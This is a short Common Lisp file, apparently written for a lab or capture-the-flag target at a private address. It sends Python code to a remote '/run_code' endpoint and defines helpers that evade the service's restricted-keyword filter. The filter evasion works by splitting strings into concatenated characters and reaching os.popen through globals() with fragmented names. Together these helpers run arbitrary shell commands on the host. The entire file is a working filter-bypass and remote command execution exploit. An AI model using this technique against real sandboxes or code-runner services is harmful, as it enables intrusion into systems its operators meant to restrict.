(in-package :grimoire)

(defun code/eval-python (code)
  (let ((res (gethash "output"
                      (jzon:parse
                       (dex:post "http://10.129.28.225:5000/run_code"
                                 :content `(("code" . ,code))
                                 read-timeout 120)))))
    (if (string= res "Use of restricted keywords is not allowed.")
        "Not allowed" (str:trim res))))

(defun code/obfuscate (string)
  (format nil "~{'~a'~^+~}" (coerce string 'list)))

(defun code/exec (command)
  "beware! this doesn't work if you use single quotes"
  (code/eval-python
   (format nil  "print(globals()['o'+'s'].__dict__['po'+'pen'](~a).__dict__['_stream'].__getattribute__('re'+'ad')())"
           (code/obfuscate command))))